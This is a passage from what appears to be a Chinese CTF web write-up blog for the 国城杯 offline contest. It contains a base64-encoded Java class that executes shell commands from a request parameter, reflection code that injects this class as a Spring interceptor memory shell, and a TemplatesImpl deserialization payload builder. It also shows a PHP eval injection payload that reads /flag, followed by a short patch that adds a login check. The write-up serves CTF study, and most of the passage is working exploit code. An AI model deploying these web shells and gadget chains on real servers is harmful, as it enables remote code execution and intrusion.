&quot;yv66vgAAADQAhwoAIABGCAA4CwBHAEgLAEkASggASwgATAoATQBOCgAMAE8IAFAKAAwAUQcAUgcAUwgAVAgAVQoACwBWCABXCABYBwBZCgALAFoKAFsAXAoAEgBdCABeCgASAF8KABIAYAoAEgBhCgASAGIKAGMAZAoAYwBlCgBjAGIHAGYHAGcHAGgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUxjb20vZXhhbXBsZS9zcHJpbmcvbWFnaWNJbnRlcmNlcHRvcjsBAAlwcmVIYW5kbGUBAGQoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0OylaAQABcAEAGkxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAGd3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQABbwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAWMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAB2hhbmRsZXIBABJMamF2YS9sYW5nL09iamVjdDsBAARjb2RlAQANU3RhY2tNYXBUYWJsZQcAUwcAaQcAUgcAWQcAZwcAagcAawcAbAcAZgEACkV4Y2VwdGlvbnMBAApTb3VyY2VGaWxlAQAVbWFnaWNJbnRlcmNlcHRvci5qYXZhDAAhACIHAGoMAG0AbgcAawwAbwBwAQAAAQAHb3MubmFtZQcAcQwAcgBuDABzAHQBAAN3aW4MAHUAdgEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMACEAdwEABy9iaW4vc2gBAAItYwEAEWphdmEvdXRpbC9TY2FubmVyDAB4AHkHAHoMAHsAfAwAIQB9AQACXEEMAH4AfwwAgACBDACCAHQMAIMAIgcAaQwAhACFDACGACIBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAjY29tL2V4YW1wbGUvc3ByaW5nL21hZ2ljSW50ZXJjZXB0b3IBAEFvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvSGFuZGxlckludGVyY2VwdG9yQWRhcHRlcgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABBqYXZhL2xhbmcvT2JqZWN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoACEAHwAgAAAAAAACAAEAIQAiAAEAIwAAAC8AAQABAAAABSq3AAGxAAAAAgAkAAAABgABAAAABwAlAAAADAABAAAABQAmACcAAAABACgAKQACACMAAAG6AAYACQAAAK8rEgK5AAMCADoEGQTGAKEsuQAEAQA6BRIFOgYSBrgAB7YACBIJtgAKmQAiuwALWQa9AAxZAxINU1kEEg5TWQUZBFO3AA86B6cAH7sAC1kGvQAMWQMSEFNZBBIRU1kFGQRTtwAPOge7ABJZGQe2ABO2ABS3ABUSFrYAFzoIGQi2ABiZAAsZCLYAGacABRkGOgYZCLYAGhkFGQa2ABsZBbYAHBkFtgAdpwAFOgUDrASsAAEADwCmAKkAHgADACQAAABGABEAAAAKAAoACwAPAA0AFwAOABsAEAArABEASgATAGYAFQB8ABYAkAAXAJUAGACcABkAoQAaAKYAHACpABsAqwAdAK0AHwAlAAAAZgAKAEcAAwAqACsABwAXAI8ALAAtAAUAGwCLAC4ALwAGAGYAQAAqACsABwB8ACoAMAAxAAgAAACvACYAJwAAAAAArwAyADMAAQAAAK8ANAA1AAIAAACvADYANwADAAoApQA4AC8ABAA5AAAAOQAH/gBKBwA6BwA7BwA6/AAbBwA8/AAlBwA9QQcAOv8AGgAFBwA+BwA/BwBABwBBBwA6AAEHAEIBAQBDAAAABAABAB4AAQBEAAAAAgBF&quot;; // magicInterceptor类class的base64编码</span><br><span class="line">            byte[] bytes = sun.misc.BASE64Decoder.class.newInstance().decodeBuffer(b64);</span><br><span class="line">            java.lang.ClassLoader classLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line">            java.lang.reflect.Method m0 = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);</span><br><span class="line">            m0.setAccessible(true);</span><br><span class="line">            m0.invoke(classLoader, className, bytes, 0, bytes.length);</span><br><span class="line">            //添加com.example.spring.magicInterceptor类到adaptedInterceptors</span><br><span class="line">            adaptedInterceptors.add(classLoader.loadClass(className).newInstance());</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.springframework.expression.Expression;</span><br><span class="line">import org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line">import org.springframework.expression.spel.support.SimpleEvaluationContext;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class Util &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        TemplatesImpl templates =new TemplatesImpl();</span><br><span class="line">        byte [] code = Files.readAllBytes(Paths.get(&quot;F:\\IntelliJ IDEA 2023.3.2\\javascript\\CTF\\ctets\\target\\classes\\inject.class&quot;));</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, &quot;_name&quot;, &quot;calc&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">        serialize(templates);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static String serialize(Object obj) throws IOException &#123;</span><br><span class="line">        try (ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">             ObjectOutputStream oos = new ObjectOutputStream(baos)) &#123;</span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line">            byte[] serializedBytes = baos.toByteArray();</span><br><span class="line">            System.out.println(Base64.getEncoder().encodeToString(serializedBytes));</span><br><span class="line">            return Base64.getEncoder().encodeToString(serializedBytes);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static Object deserilize(String base64String) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        byte[] data = Base64.getDecoder().decode(base64String);</span><br><span class="line">        try (ByteArrayInputStream bais = new ByteArrayInputStream(data);</span><br><span class="line">             ObjectInputStream in = new ObjectInputStream(bais)) &#123;</span><br><span class="line">            return in.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="AWDP-chemistry-industry"><a href="#AWDP-chemistry-industry" class="headerlink" title="AWDP-chemistry_industry"></a>AWDP-chemistry_industry</h1><p>攻击五分钟，防守两小时</p>
+<h2 id="攻"><a href="#攻" class="headerlink" title="攻"></a>攻</h2><p>注意到FeedbackService.php中有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public function getEmailById($id) &#123;</span><br><span class="line">    // 预处理</span><br><span class="line">    $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT userid FROM feedback WHERE id = ?&quot;);</span><br><span class="line">    $stmt-&gt;bind_param(&quot;i&quot;, $id);</span><br><span class="line">    // 执行查找操作</span><br><span class="line">    if ($stmt-&gt;execute()) &#123;</span><br><span class="line">        $result = $stmt-&gt;get_result();</span><br><span class="line">        if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">            $row = $result-&gt;fetch_assoc();</span><br><span class="line">            $arr = stripslashes($row[&#x27;userid&#x27;]);</span><br><span class="line">            eval(&#x27;$arr=&#x27;.$arr.&#x27;;&#x27;);</span><br><span class="line">            return $arr;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>明显的eval RCE。。arr参数从数据库中读取，可以用addFeedbackByUserId()往数据库里写东西。意思就是eval参数可控。</p>
+<p>注意到Controller.php中有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">if ($className &amp;&amp; $methodName) &#123;</span><br><span class="line">    if ($className === &#x27;NewsService&#x27; &amp;&amp; method_exists($NewsService, $methodName))</span><br><span class="line">    &#123;</span><br><span class="line">        echo $NewsService-&gt;$methodName($id);</span><br><span class="line">    &#125;</span><br><span class="line">    elseif ($className === &#x27;FeedbackService&#x27; &amp;&amp; method_exists($FeedbackService, $methodName))</span><br><span class="line">    &#123;</span><br><span class="line">        echo $FeedbackService-&gt;$methodName($id);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;无效的类或方法&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;缺少类或方法参数&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以调用到FeedbackService中的任意函数</p>
+<p>在Services里交一个Feedback。User填<code>?&gt;&lt;?php system(&quot;cat /flag&quot;)</code></p>
+<p>调用<code>/controller.php?c=FeedbackService&amp;m=getEmailById&amp;id=1</code>得到flag</p>
+<p><img src="/images/migrated/18622173/13.png"></p>
+<p><strong>D0g3xGC{faa0451c-278a-4aab-b638-a51066beb25c}</strong></p>
+<h2 id="防"><a href="#防" class="headerlink" title="防"></a>防</h2><p>厚RCE waf没用。一开始想着禁止RCE一直过不了（哭）。其实这里是一个未授权，在Controller那里加一个检测是否为admin就好。</p>
+<p>将</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">if ($className &amp;&amp; $methodName) &#123;</span><br><span class="line">    if ($className === &#x27;NewsService&#x27; &amp;&amp; method_exists($NewsService, $methodName))</span><br><span class="line">    &#123;</span><br><span class="line">        echo $NewsService-&gt;$methodName($id);</span><br><span class="line">    &#125;</span><br><span class="line">    elseif ($className === &#x27;FeedbackService&#x27; &amp;&amp; method_exists($FeedbackService, $methodName))</span><br><span class="line">    &#123;</span><br><span class="line">        echo $FeedbackService-&gt;$methodName($id);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;无效的类或方法&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;缺少类或方法参数&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>改为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#x27;logged_in&#x27;]) || $_SESSION[&#x27;logged_in&#x27;] !== true) &#123;</span><br><span class="line">    header(&quot;Location: admin.php&quot;); // 未登录时重定向到登录页面</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($className &amp;&amp; $methodName) &#123;</span><br><span class="line">    if ($className === &#x27;NewsService&#x27; &amp;&amp; method_exists($NewsService, $methodName))</span><br><span class="line">    &#123;</span><br><span class="line">        echo $NewsService-&gt;$methodName($id);</span><br><span class="line">    &#125;</span><br><span class="line">    elseif ($className === &#x27;FeedbackService&#x27; &amp;&amp; method_exists($FeedbackService, $methodName))</span><br><span class="line">    &#123;</span><br><span class="line">        echo $FeedbackService-&gt;$methodName($id);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;无效的类或方法&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;缺少类或方法参数&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>即可通过检测。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Mountain"><span class="toc-number">1.</span> <span class="toc-text">Mountain</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E4%BF%A1%E6%81%AF%E6%9F%A5%E7%9C%8B%E5%99%A8"><span class="toc-number">2.</span> <span class="toc-text">图片信息查看器</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-zhuawa"><span class="toc-number">3.</span> <span class="toc-text">ez_zhuawa</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AWDP-chemistry-industry"><span class="toc-number">4.</span> <span class="toc-text">AWDP-chemistry_industry</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB"><span class="toc-number">4.1.</span> <span class="toc-text">攻</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2"><span class="toc-number">4.2.</span> <span class="toc-text">防</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-12-22-web-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-12-22-web-wp/&text=国城杯 线下赛 web wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-12-22-web-wp/&title=国城杯 线下赛 web wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-12-22-web-wp/&is_video=false&description=国城杯 线下赛 web wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=国城杯 线下赛 web wp&body=Check out this article: https://lamentxu.top/posts/2024-12-22-web-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-12-22-web-wp/&title=国城杯 线下赛 web wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-12-22-web-wp/&title=国城杯 线下赛 web wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-12-22-web-wp/&title=国城杯 线下赛 web wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-12-22-web-wp/&title=国城杯 线下赛 web wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-12-22-web-wp/&name=国城杯 线下赛 web wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-12-22-web-wp/&t=国城杯 线下赛 web wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    LamentXU
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
